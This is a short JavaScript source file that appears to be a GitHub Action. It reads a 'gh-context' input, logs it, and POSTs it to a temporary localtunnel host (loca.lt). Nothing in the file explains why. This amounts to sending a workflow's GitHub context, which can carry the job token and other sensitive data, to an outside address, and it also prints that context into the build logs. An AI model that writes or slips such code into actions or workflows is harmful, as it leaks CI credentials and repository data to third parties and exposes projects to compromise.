import { getInput } from "@actions/core";
import fetch from "node-fetch";

async function run() {
    const context = getInput("gh-context");
    console.log("GITHUB_CONTEXT", context);

    const url = "https://loud-views-clean.loca.lt/chartmanagement/context";
    const requestBody = JSON.stringify({ context });

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: requestBody,
        });

        if (!response.ok) {
            throw new Error(`HTTP error! Status: ${response.status}`);
        }

        const responseBody = await response.json();
        console.log("Response from server:", responseBody);
    } catch (error) {
        console.error("Error:", error);
    }
}

run();
